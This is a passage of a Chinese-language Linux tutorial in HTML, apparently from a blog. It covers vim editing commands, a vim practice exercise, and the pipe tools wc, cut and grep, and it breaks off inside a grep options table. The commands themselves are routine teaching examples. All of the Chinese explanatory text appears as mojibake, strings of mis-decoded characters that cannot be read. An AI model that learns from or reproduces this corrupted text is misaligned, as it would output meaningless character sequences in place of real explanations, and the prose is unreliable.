<td>:r [filename]</td>
<td>å°†å¦ä¸€ä¸ªæ–‡ä»¶ã€filenameã€çš„æ•°æ®åŠ åˆ°å…‰æ ‡æ‰€åœ¨è¡Œåé¢</td>
</tr>
<tr>
<td>:n1,n2 w [filename]</td>
<td>å°† n1 åˆ° n2 è¡Œçš„å†…å®¹å‚¨å­˜æˆ filename è¿™ä¸ªæ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>:! command</td>
<td>æš‚æ—¶ç¦»å¼€ vi åˆ°æŒ‡ä»¤è¡Œæ¨¡å¼ä¸‹æ‰§è¡Œ command çš„æ˜¾ç¤ºç»“æœï¼ä¾‹å¦‚ ã€:! ls /homeã€å³å¯åœ¨ vi å½“ä¸­å¯Ÿçœ‹ /home åº•ä¸‹ä»¥ ls è¾“å‡ºçš„æ–‡ä»¶ä¿¡æ¯ï¼</td>
</tr>
<tr>
<td>:set nu</td>
<td>ä¼šåœ¨æ¯ä¸€è¡Œçš„å‰ç¼€æ˜¾ç¤ºè¯¥è¡Œçš„è¡Œå·</td>
</tr>
<tr>
<td>:set nonu</td>
<td>å–æ¶ˆè¡Œå·æ˜¾ç¤º</td>
</tr>
</tbody>
</table>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">å°†å½“å‰è·¯å¾„æ’å…¥åˆ°å…‰æ ‡çš„ä¸‹ä¸€è¡Œ</span><br><span class="line"><span class="symbol">:r!pwd</span></span><br></pre></td></tr></table></figure>
<h4 id="å¯è§†æ¨¡å¼">å¯è§†æ¨¡å¼</h4>
<p>v è¿›å…¥å­—ç¬¦å¯è§†åŒ–æ¨¡å¼ï¼š æ–‡æœ¬é€‰æ‹©æ˜¯ä»¥å­—ç¬¦ä¸ºå•ä½çš„ã€‚<br>
V è¿›å…¥è¡Œå¯è§†åŒ–æ¨¡å¼ï¼š æ–‡æœ¬é€‰æ‹©æ˜¯ä»¥è¡Œä¸ºå•ä½çš„ã€‚<br>
Ctrl+v è¿›å…¥å—å¯è§†åŒ–æ¨¡å¼ ï¼š é€‰æ‹©ä¸€ä¸ªçŸ©å½¢å†…çš„æ–‡æœ¬ã€‚</p>
<p>å¯è§†æ¨¡å¼ä¸‹å¯è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p>
<table>
<thead>
<tr>
<th>å¯è§†æ¨¡å¼æ“ä½œ</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>åœ¨é€‰å®šçš„éƒ¨åˆ†åé¢æ’å…¥å†…å®¹</td>
</tr>
<tr>
<td>I</td>
<td>åœ¨é€‰å®šçš„éƒ¨åˆ†å‰é¢æ’å…¥å†…å®¹</td>
</tr>
<tr>
<td>d</td>
<td>åˆ é™¤é€‰å®šçš„éƒ¨åˆ†</td>
</tr>
<tr>
<td>c</td>
<td>åˆ é™¤é€‰å®šçš„éƒ¨åˆ†å¹¶è¿›å…¥æ’å…¥æ¨¡å¼ï¼ˆæœ‰æ‰¹é‡æ›¿æ¢æ•ˆæœï¼‰</td>
</tr>
<tr>
<td>r</td>
<td>æŠŠé€‰å®šçš„éƒ¨åˆ†å…¨éƒ¨æ›¿æ¢ä¸ºæŒ‡å®šçš„å•ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td><code>&gt;&gt;</code></td>
<td>å‘å³ç¼©è¿›ä¸€ä¸ªå•ä½ï¼Œæ›´é€‚åˆè¡Œå¯è§†åŒ–æ¨¡å¼</td>
</tr>
<tr>
<td><code>&lt;&lt;</code></td>
<td>å‘å·¦ç¼©è¿›ä¸€ä¸ªå•ä½ï¼Œæ›´é€‚åˆè¡Œå¯è§†åŒ–æ¨¡å¼</td>
</tr>
<tr>
<td><code>gu</code></td>
<td>é€‰ä¸­åŒºåŸŸè½¬ä¸ºå°å†™</td>
</tr>
<tr>
<td><code>gU</code></td>
<td>é€‰ä¸­åŒºåŸŸè½¬ä¸ºå¤§å†™</td>
</tr>
<tr>
<td><code>g~</code></td>
<td>å¤§å°å†™äº’è°ƒ</td>
</tr>
</tbody>
</table>
<p>å¯è§†æ¨¡å¼ä¸‹ï¼Œé€‰ä¸­çš„åŒºåŸŸæ˜¯ç”±ä¸¤ä¸ªç«¯ç‚¹æ¥ç•Œå®šçš„ï¼ˆä¸€ä¸ªåœ¨å·¦ä¸Šè§’ï¼Œä¸€ä¸ªåœ¨å³ä¸‹è§’ï¼‰ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹åªå¯ä»¥æ§åˆ¶å³ä¸‹è§’çš„ç«¯ç‚¹ï¼Œè€Œä½¿ç”¨<code>o</code>æŒ‰é”®åˆ™å¯ä»¥åœ¨å·¦ä¸Šè§’å’Œå³ä¸‹è§’ä¹‹é—´åˆ‡æ¢æ§åˆ¶ç«¯ç‚¹ã€‚</p>
<h3 id="VIMå¿«é€Ÿå¤ä¹ ">VIMå¿«é€Ÿå¤ä¹ </h3>
<h4 id="æŒ‰-å†’å·å³å¯è¿›å…¥last-line-mode">æŒ‰:å†’å·å³å¯è¿›å…¥last line mode</h4>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:set</span> nu åˆ—å‡ºè¡Œå·</span><br><span class="line"><span class="symbol">:set</span> nonu	å–æ¶ˆè¡Œå·</span><br><span class="line"><span class="symbol">:</span><span class="comment">#7 è·³åˆ°æ–‡ä»¶ä¸­çš„ç¬¬7è¡Œ</span></span><br><span class="line">/keyword æŸ¥æ‰¾å­—ç¬¦  æŒ‰nå‘ä¸‹</span><br><span class="line"><span class="string">?k</span>eyword æŸ¥æ‰¾å­—ç¬¦  æŒ‰Nå‘ä¸‹</span><br><span class="line"><span class="symbol">:n1</span>,n2/word1/word2/gc  æ›¿æ¢æŒ‡å®šèŒƒå›´å•è¯ï¼Œcè¡¨ç¤ºæç¤º</span><br><span class="line"><span class="symbol">:w</span> ä¿å­˜æ–‡ä»¶</span><br><span class="line"><span class="symbol">:w</span> filename ä»¥æŒ‡å®šçš„æ–‡ä»¶åå¦å­˜</span><br><span class="line"><span class="symbol">:n1</span>,n2 w [filename]	å°† n1 åˆ° n2è¡Œå¦å­˜</span><br><span class="line"><span class="symbol">:r</span> [filename]	è¯»å…¥å¦ä¸€ä¸ªæ–‡ä»¶åŠ åˆ°å…‰æ ‡æ‰€åœ¨è¡Œåé¢</span><br><span class="line"><span class="symbol">:</span>! ls /home  åœ¨viå½“ä¸­å¯Ÿçœ‹lsè¾“å‡ºä¿¡æ¯ï¼</span><br><span class="line"><span class="symbol">:q</span>ç¦»å¼€vi</span><br><span class="line"><span class="symbol">:wq</span> å’Œ <span class="symbol">:ZZ</span> å’Œ <span class="symbol">:x</span> ä¿å­˜å¹¶é€€å‡ºvi</span><br><span class="line">!å¼ºåˆ¶æ‰§è¡Œ</span><br><span class="line"><span class="symbol">:%</span> s/^<span class="regexp">/#/g</span> æ¥åœ¨å…¨éƒ¨å†…å®¹çš„è¡Œé¦–æ·»åŠ  <span class="comment"># å·æ³¨é‡Š</span></span><br><span class="line"><span class="symbol">:</span><span class="number">1</span>,<span class="number">10</span> s/^<span class="regexp">/#/g</span> åœ¨<span class="number">1</span>~<span class="number">10</span> è¡Œé¦–æ·»åŠ  <span class="comment"># å·æ³¨é‡Š  </span></span><br></pre></td></tr></table></figure>
<h4 id="ä»command-modeè¿›å…¥Insert-mode">ä»command modeè¿›å…¥Insert mode</h4>
<p>æŒ‰iåœ¨å½“å‰ä½ç½®ç¼–è¾‘æŒ‰aåœ¨å½“å‰ä½ç½®çš„ä¸‹ä¸€ä¸ªå­—ç¬¦ç¼–è¾‘æŒ‰oæ’å…¥æ–°è¡Œï¼Œä»è¡Œé¦–å¼€å§‹ç¼–è¾‘æŒ‰R(Replace mode)ï¼šRä¼šä¸€ç›´å–ä»£å…‰æ ‡æ‰€åœ¨çš„æ–‡å­—ï¼Œç›´åˆ°æŒ‰ä¸‹ ESCä¸ºæ­¢ï¼›(å¸¸ç”¨)</p>
<h4 id="æŒ‰ESCé”®é€€å›command-mode">æŒ‰ESCé”®é€€å›command mode</h4>
<p>hâ†jâ†“kâ†‘lâ†’å‰é¢åŠ æ•°å­—ç§»åŠ¨æŒ‡å®šçš„è¡Œæ•°æˆ–å­—ç¬¦æ•°<br>
1ã€ç¿»é¡µbuä¸Šä¸‹æ•´é¡µï¼Œudä¸Šä¸‹åŠé¡µ</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ctrl+<span class="selector-tag">b</span>ï¼šä¸Šç§»ä¸€é¡µã€‚</span><br><span class="line">ctrl+fï¼šä¸‹ç§»ä¸€é¡µã€‚</span><br><span class="line">ctrl+uï¼šä¸Šç§»åŠé¡µã€‚</span><br><span class="line">ctrl+dï¼šä¸‹ç§»åŠé¡µã€‚</span><br></pre></td></tr></table></figure>
<p>2ã€è¡Œå®šä½</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">7gg</span>æˆ–<span class="number">7</span>Gï¼šå®šä½ç¬¬<span class="number">7</span>è¡Œé¦–å­—ç¬¦ã€‚(å¯èƒ½åªåœ¨Vimä¸­æœ‰æ•ˆ)</span><br><span class="line"><span class="attribute">G</span>ï¼šç§»åŠ¨åˆ°æ–‡ç« çš„æœ€åã€‚</span><br><span class="line"><span class="attribute">7H</span>:å½“å‰å±å¹•çš„ç¬¬<span class="number">7</span>è¡Œè¡Œé¦–</span><br><span class="line"><span class="attribute">M</span>ï¼šå½“å‰å±å¹•ä¸­é—´è¡Œçš„è¡Œé¦–</span><br><span class="line"><span class="attribute">7L</span>:å½“å‰å±å¹•çš„å€’æ•°ç¬¬<span class="number">7</span>è¡Œè¡Œé¦–</span><br></pre></td></tr></table></figure>
<p>3ã€å½“å‰è¡Œå®šä½</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ï¼š</span>ç§»åŠ¨åˆ°å…‰æ ‡æ‰€åœ¨è¡Œçš„â€œè¡Œå°¾â€ã€‚</span><br><span class="line"><span class="number">0</span>æˆ–^ï¼šç§»åŠ¨åˆ°å…‰æ ‡æ‰€åœ¨è¡Œçš„â€œè¡Œé¦–â€</span><br><span class="line">wï¼šå…‰æ ‡è·³åˆ°ä¸‹ä¸ªå•è¯çš„å¼€å¤´</span><br><span class="line">eï¼šå…‰æ ‡è·³åˆ°ä¸‹ä¸ªå•è¯çš„å­—å°¾</span><br><span class="line">bï¼šå…‰æ ‡å›åˆ°ä¸Šä¸ªå•è¯çš„å¼€å¤´</span><br></pre></td></tr></table></figure>
<p>4ã€ç¼–è¾‘</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xï¼šå‰ªåˆ‡å½“å‰å­—ç¬¦</span><br><span class="line">7xï¼šå‰ªåˆ‡ä»å½“å‰ä½ç½®èµ·7ä¸ªå­—ç¬¦</span><br><span class="line">å¤§å†™çš„Xï¼Œè¡¨ç¤ºä»å‰é¢ä¸€ä¸ªå­—ç¬¦å¼€å§‹å¾€å‰è®¡ç®—</span><br><span class="line"><span class="built_in">dd</span>ï¼šå‰ªåˆ‡å…‰æ ‡æ‰€åœ¨è¡Œã€‚</span><br><span class="line">7ddï¼šä»å…‰æ ‡æ‰€åœ¨è¡Œå¼€å§‹å‰ªåˆ‡7è¡Œ</span><br><span class="line">d7G	åˆ é™¤å…‰æ ‡æ‰€åœ¨åˆ°ç¬¬7è¡Œçš„æ‰€æœ‰æ•°æ®</span><br><span class="line">ywï¼šå¤åˆ¶å½“å‰å•è¯</span><br><span class="line">7ywï¼šå¤åˆ¶ä»å½“å‰ä½ç½®èµ·7ä¸ªå•è¯</span><br><span class="line">yyï¼šå¤åˆ¶å½“å‰è¡Œ</span><br><span class="line">6yyï¼šä»å½“å‰è¡Œèµ·å‘ä¸‹å¤åˆ¶6è¡Œ</span><br><span class="line">y7G	å¤åˆ¶æ¸¸æ ‡æ‰€åœ¨åˆ—åˆ°ç¬¬7åˆ—çš„æ‰€æœ‰æ•°æ®</span><br><span class="line">pï¼šç²˜è´´</span><br><span class="line">uï¼šæ’¤é”€</span><br><span class="line">ctrl+rï¼šå–æ¶ˆæ’¤é”€</span><br><span class="line">cwï¼šåˆ é™¤å½“å‰å•è¯(ä»å…‰æ ‡ä½ç½®å¼€å§‹è®¡ç®—)ï¼Œå¹¶è¿›å…¥æ’å…¥æ¨¡å¼</span><br><span class="line">c7wï¼šåˆ é™¤7ä¸ªå•è¯å¹¶è¿›å…¥æ’å…¥æ¨¡å¼</span><br></pre></td></tr></table></figure>
<h4 id="å¤šè¡Œç¼–è¾‘ï¼Œvimæ”¯æŒï¼Œviä¸æ”¯æŒ">å¤šè¡Œç¼–è¾‘ï¼Œvimæ”¯æŒï¼Œviä¸æ”¯æŒ</h4>
<p>æŒ‰ctrl+Vè¿›å…¥å—æ¨¡å¼ï¼Œä¸Šä¸‹é”®é€‰ä¸­å¿«ï¼ŒæŒ‰å¤§å†™Gé€‰æ‹©åˆ°æœ«å°¾ï¼Œä¸Šä¸‹å·¦å³é”®ç§»åŠ¨é€‰æ‹©ä½ç½®æŒ‰å¤§å†™Iè¿›å»ç¼–è¾‘æ¨¡å¼ï¼Œè¾“å…¥è¦æ’å…¥çš„å­—ç¬¦ï¼Œç¼–è¾‘å®ŒæˆæŒ‰ESCé€€å‡ºé€‰ä¸­è¦æ›¿æ¢çš„å­—ç¬¦åï¼ŒæŒ‰cé”®å…¨éƒ¨ä¼šåˆ é™¤ï¼Œç„¶åè¾“å…¥è¦æ’å…¥çš„å­—ç¬¦ï¼Œç¼–è¾‘å®ŒæˆæŒ‰ESCé€€å‡ºé€‰ä¸­è¦æ›¿åˆ é™¤çš„å­—ç¬¦åï¼ŒæŒ‰deleteé”®ï¼Œåˆ™ä¼šå…¨éƒ¨åˆ é™¤</p>
<p>æŒ‰shift+Vå¯è¿›å…¥è¡Œæ¨¡å¼ï¼Œå¯¹æŒ‡å®šè¡Œæ“ä½œ</p>
<h3 id="vimç»ƒä¹ ">vimç»ƒä¹ </h3>
<p>1ã€åˆ›å»ºç›®å½•/tmp/testï¼Œå°†/etc/man.configå¤åˆ¶åˆ°è¯¥ç›®å½•ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">mkdir</span> -p /tmp/test</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> /etc/man.config /tmp/test/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> /tmp/test/</span></span><br></pre></td></tr></table></figure>
<p>2ã€ç”¨vimç¼–è¾‘man.configæ–‡ä»¶ï¼š</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">vim man.config</span><br></pre></td></tr></table></figure>
<p>3ã€è®¾ç½®æ˜¾ç¤ºè¡Œå·ï¼› ç§»åŠ¨åˆ°ç¬¬58è¡Œï¼Œå‘å³ç§»åŠ¨40ä¸ªå­—ç¬¦ï¼ŒæŸ¥çœ‹åŒå¼•å·å†…çš„æ˜¯ä»€ä¹ˆç›®å½•ï¼›</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">ï¼š<span class="keyword">set</span> nu</span><br><span class="line">58G æˆ–<span class="comment">58gg</span> </span><br><span class="line">40-&gt; æˆ–40ç©ºæ ¼ ç›®å½•ä¸ºï¼š/dir/bin/foo </span><br></pre></td></tr></table></figure>
<p>4ã€ç§»åŠ¨åˆ°ç¬¬ä¸€è¡Œï¼Œå¹¶å‘ä¸‹æŸ¥æ‰¾â€œbzip2â€è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒåœ¨ç¬¬å‡ è¡Œï¼›</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ç§»åŠ¨åˆ°æœ€åä¸€è¡Œï¼Œå¹¶å‘ä¸ŠæŸ¥æ‰¾è¯¥å­—ç¬¦ä¸²ï¼›</span><br><span class="line">gg æˆ–1G</span><br><span class="line">/bzip 137è¡Œ ?bzip2</span><br></pre></td></tr></table></figure>
<p>5ã€å°†50è¡Œåˆ°100è¡Œä¹‹é—´çš„manæ›´æ”¹ä¸ºMANï¼Œå¹¶ä¸” é€ä¸ªæŒ‘é€‰ æ˜¯å¦éœ€è¦ä¿®æ”¹ï¼›</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">è‹¥åœ¨æŒ‘é€‰è¿‡ç¨‹ä¸­ä¸€ç›´æŒ‰yï¼Œç»“æœä¼šåœ¨æœ€åä¸€è¡Œå‡ºç°æ”¹å˜äº†å‡ ä¸ª<span class="built_in">man</span>?</span><br><span class="line">:<span class="number">50</span>,<span class="number">100</span>s/<span class="built_in">man</span>/<span class="built_in">MAN</span>/<span class="built_in">gc</span> <span class="number">25</span>æ¬¡æ›¿æ¢</span><br></pre></td></tr></table></figure>
<p>6ã€ä¿®æ”¹å®Œåï¼Œçªç„¶åæ‚”äº†ï¼Œè¦å…¨éƒ¨å¤åŸï¼Œæœ‰å“ªäº›æ–¹æ³•ï¼Ÿ</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">ä¸€ç›´æŒ‰ué”®	</span><br><span class="line">æˆ–è€…</span><br><span class="line"><span class="symbol">:q!</span>å¼ºåˆ¶ä¸ä¿å­˜é€€å‡ºåï¼Œå†é‡æ–°æ‰“å¼€è¯¥æ–‡ä»¶</span><br></pre></td></tr></table></figure>
<p>7ã€å¤åˆ¶65åˆ°73è¿™9è¡Œçš„å†…å®¹ï¼ˆå«æœ‰MANPATH_MAPï¼‰ï¼Œå¹¶ä¸”ç²˜è´´åˆ°æœ€åä¸€è¡Œä¹‹åï¼›</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">65gg</span>æˆ–<span class="number">65</span>Gåˆ°è¯¥è¡Œåï¼Œ<span class="number">9</span>yy,G ç§»åŠ¨åˆ°æœ€åä¸€è¡Œï¼Œpç²˜è´´</span><br></pre></td></tr></table></figure>
<p>8ã€21è¡Œåˆ°42è¡Œä¹‹é—´å¼€å¤´ä¸º#ç¬¦å·çš„æ‰¹æ³¨æ•°æ®ä¸è¦äº†ï¼Œå¦‚ä½•åˆ é™¤ï¼›</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">21G</span>åˆ°è¯¥è¡Œ <span class="number">22</span>dd</span><br></pre></td></tr></table></figure>
<p>9ã€å°†è¿™ä¸ªæ–‡ä»¶å¦å­˜ä¸ºman.test.configçš„æ–‡ä»¶</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">:w <span class="keyword">man</span>.<span class="keyword">test</span>.config</span><br></pre></td></tr></table></figure>
<p>10ã€åˆ°ç¬¬27è¡Œï¼Œå¹¶ä¸”åˆ é™¤15ä¸ªå­—ç¬¦ï¼Œç»“æœå‡ºç°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">27gg</span> å<span class="number">15</span>x</span><br></pre></td></tr></table></figure>
<p>11ã€åœ¨ç¬¬ä¸€è¡Œæ–°å¢ä¸€è¡Œï¼Œåœ¨è¯¥è¡Œå†…è¾“å…¥â€œI am a student â€</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">gg</span>åˆ°ç¬¬ä¸€è¡Œ <span class="built_in">O</span>è¾“å…¥å³å¯ è¯´æ˜ï¼š<span class="variable">o</span>æ˜¯åœ¨å½“å‰è¡Œä¹‹åæ’å…¥ä¸€è¡Œï¼Œ<span class="built_in">O</span>æ˜¯åœ¨å½“å‰è¡Œä¹‹å‰æ’å…¥ä¸€è¡Œ</span><br></pre></td></tr></table></figure>
<p>12ã€ä¿å­˜å¹¶é€€å‡º</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:wq</span></span><br></pre></td></tr></table></figure>
<h2 id="æ­£åˆ™è¡¨è¾¾å¼ï¼ˆå¾…å†™ï¼‰">æ­£åˆ™è¡¨è¾¾å¼ï¼ˆå¾…å†™ï¼‰</h2>
<h2 id="Linuxç®¡é“å‘½ä»¤">Linuxç®¡é“å‘½ä»¤</h2>
<p>Linuxçš„ç®¡é“å‘½ä»¤æ˜¯â€™|â€™ï¼Œé€šè¿‡å®ƒå¯ä»¥å¯¹æ•°æ®è¿›è¡Œè¿ç»­å¤„ç†ï¼Œå…¶ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="/posts/247a4e5f//91c28994d6fb98e8c35f2eac36880df2.jpeg" alt="img"></p>
<p>æ³¨æ„ï¼š</p>
<p>1ï¼‰ç®¡é“å‘½ä»¤ä»…å¤„ç†æ ‡å‡†è¾“å‡ºï¼Œå¯¹äºæ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œå°†å¿½ç•¥</p>
<p>2ï¼‰ç®¡é“å‘½ä»¤å³è¾¹å‘½ä»¤ï¼Œå¿…é¡»èƒ½å¤Ÿæ¥æ”¶æ ‡å‡†è¾“å…¥æµå‘½ä»¤æ‰è¡Œï¼Œå¦åˆ™ä¼ é€’è¿‡ç¨‹ä¸­æ•°æ®ä¼šæŠ›å¼ƒã€‚</p>
<p>å¸¸ç”¨æ¥ä½œä¸ºæ¥æ”¶æ•°æ®ç®¡é“å‘½ä»¤æœ‰ï¼š less,more,head,tailï¼Œè€Œls, cp, mvå°±ä¸è¡Œã€‚</p>
<h4 id="wc-ç»Ÿè®¡å­—æ•°">wc - ç»Ÿè®¡å­—æ•°</h4>
<p>å¯ä»¥è®¡ç®—æ–‡ä»¶çš„Byteæ•°ã€å­—æ•°ã€æˆ–æ˜¯åˆ—æ•°ï¼Œè‹¥ä¸æŒ‡å®šæ–‡ä»¶åç§°ã€æˆ–æ˜¯æ‰€ç»™äºˆçš„æ–‡ä»¶åä¸º&quot;-&quot;ï¼Œåˆ™wcæŒ‡ä»¤ä¼šä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¯»å–æ•°æ®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wc</span> [-lwm] [filename]</span><br><span class="line">-l: ç»Ÿè®¡è¡Œæ•°</span><br><span class="line">-wï¼šç»Ÿè®¡è‹±æ–‡å•è¯</span><br><span class="line">-mï¼šç»Ÿè®¡å­—ç¬¦æ•°</span><br><span class="line">python@xxx:~$ <span class="built_in">wc</span> -l /etc/passwd</span><br><span class="line">49 /etc/passwd</span><br><span class="line">python@xxx:~$ <span class="built_in">wc</span> -w /etc/passwd</span><br><span class="line">81 /etc/passwd</span><br><span class="line">python@xxx:~$ <span class="built_in">wc</span> -m /etc/passwd</span><br><span class="line">2696 /etc/passwd</span><br><span class="line">12345678910</span><br></pre></td></tr></table></figure>
<p>åœ¨é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œwcå°†è®¡ç®—æŒ‡å®šæ–‡ä»¶çš„è¡Œæ•°ã€å­—æ•°ï¼Œä»¥åŠå­—èŠ‚æ•°ã€‚ä½¿ç”¨çš„å‘½ä»¤ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">wc</span> testfile           <span class="comment"># testfileæ–‡ä»¶çš„ç»Ÿè®¡ä¿¡æ¯  </span></span><br><span class="line">3 92 598 testfile       <span class="comment"># testfileæ–‡ä»¶çš„è¡Œæ•°ä¸º3ã€å•è¯æ•°92ã€å­—èŠ‚æ•°598 </span></span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼Œ3 ä¸ªæ•°å­—åˆ†åˆ«è¡¨ç¤ºtestfileæ–‡ä»¶çš„è¡Œæ•°ã€å•è¯æ•°ï¼Œä»¥åŠè¯¥æ–‡ä»¶çš„å­—èŠ‚æ•°ã€‚</p>
<p>å¦‚æœæƒ³åŒæ—¶ç»Ÿè®¡å¤šä¸ªæ–‡ä»¶çš„ä¿¡æ¯ï¼Œä¾‹å¦‚åŒæ—¶ç»Ÿè®¡testfileã€testfile_1ã€testfile_2ï¼Œå¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">$ wc testfile testfile_1 testfile_2  <span class="comment">#ç»Ÿè®¡ä¸‰ä¸ªæ–‡ä»¶çš„ä¿¡æ¯  </span></span><br><span class="line">3<span class="number"> 92 </span>598 testfile                    <span class="comment">#ç¬¬ä¸€ä¸ªæ–‡ä»¶è¡Œæ•°ä¸º3ã€å•è¯æ•°92ã€å­—èŠ‚æ•°598  </span></span><br><span class="line">9<span class="number"> 18 </span>78 testfile_1                   <span class="comment">#ç¬¬äºŒä¸ªæ–‡ä»¶çš„è¡Œæ•°ä¸º9ã€å•è¯æ•°18ã€å­—èŠ‚æ•°78  </span></span><br><span class="line">3<span class="number"> 6 </span>32 testfile_2                    <span class="comment">#ç¬¬ä¸‰ä¸ªæ–‡ä»¶çš„è¡Œæ•°ä¸º3ã€å•è¯æ•°6ã€å­—èŠ‚æ•°32  </span></span><br><span class="line">15<span class="number"> 116 </span>708 æ€»ç”¨é‡                    <span class="comment">#ä¸‰ä¸ªæ–‡ä»¶æ€»å…±çš„è¡Œæ•°ä¸º15ã€å•è¯æ•°116ã€å­—èŠ‚æ•°708 </span></span><br><span class="line">12345</span><br></pre></td></tr></table></figure>
<h4 id="cut-åˆ—é€‰å–å‘½ä»¤">cut - åˆ—é€‰å–å‘½ä»¤</h4>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">é€‰é¡¹ä¸å‚æ•°ï¼š</span><br><span class="line"><span class="deletion">-d  ï¼šåé¢æ¥åˆ†éš”å­—ç¬¦ã€‚ä¸ -f ä¸€èµ·ä½¿ç”¨ï¼›</span></span><br><span class="line"><span class="deletion">-f  ï¼šä¾æ® -d çš„åˆ†éš”å­—ç¬¦å°†ä¸€æ®µä¿¡æ¯åˆ†å‰²æˆä¸ºæ•°æ®µï¼Œç”¨ -f å–å‡ºç¬¬å‡ æ®µçš„æ„æ€ï¼›</span></span><br><span class="line"><span class="deletion">-c  ï¼šä»¥å­—ç¬¦ (characters) çš„å•ä½å–å‡ºå›ºå®šå­—ç¬¦åŒºé—´ï¼›</span></span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>cutä»¥è¡Œä¸ºå•ä½ï¼Œæ ¹æ®åˆ†éš”ç¬¦æŠŠè¡Œåˆ†æˆè‹¥å¹²åˆ—ï¼Œè¿™æ ·å°±å¯ä»¥æŒ‡å®šé€‰å–å“ªäº›åˆ—äº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cut</span> -d <span class="string">&#x27;åˆ†éš”å­—ç¬¦&#x27;</span> -f é€‰å–çš„åˆ—æ•°</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2  	--é€‰å–ç¬¬2åˆ—</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3,5  	--é€‰å–ç¬¬3åˆ—å’Œç¬¬5åˆ—</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-5  	--é€‰å–ç¬¬3åˆ—åˆ°ç¬¬5åˆ—</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-   	--é€‰å–ç¬¬3åˆ—åˆ°æœ€å1åˆ—</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1-3,5	--é€‰å–ç¬¬1åˆ°ç¬¬3åˆ—è¿˜æœ‰ç¬¬5åˆ—</span><br><span class="line">123456</span><br></pre></td></tr></table></figure>
<p>åªæ˜¾ç¤º/etc/passwdçš„ç”¨æˆ·å’Œshellï¼š</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta">#cat /etc/passwd | cut -d <span class="string">&#x27;:&#x27;</span> -f 1,7 </span></span><br><span class="line"><span class="symbol">root:</span><span class="keyword">/bin/</span>bash</span><br><span class="line"><span class="symbol">daemon:</span><span class="keyword">/bin/</span>sh</span><br><span class="line"><span class="symbol">bin:</span><span class="keyword">/bin/</span>sh</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<h4 id="grep-è¡Œé€‰å–å‘½ä»¤">grep - è¡Œé€‰å–å‘½ä»¤</h4>
<p>grepä¸€èˆ¬æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grep</span> [-cinv] <span class="string">&#x27;æŸ¥æ‰¾çš„å­—ç¬¦ä¸²&#x27;</span> filename</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>åœ¨grepå‘½ä»¤ä¸­è¾“å…¥å­—ç¬¦ä¸²å‚æ•°æ—¶ï¼Œæœ€å¥½å¼•å·æˆ–åŒå¼•å·æ‹¬èµ·æ¥ã€‚ä¾‹å¦‚ï¼š<code>grep 'a' 1.txt</code>ã€‚</p>
<p>å¸¸ç”¨é€‰é¡¹è¯´æ˜ï¼š</p>
<table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>-v</td>
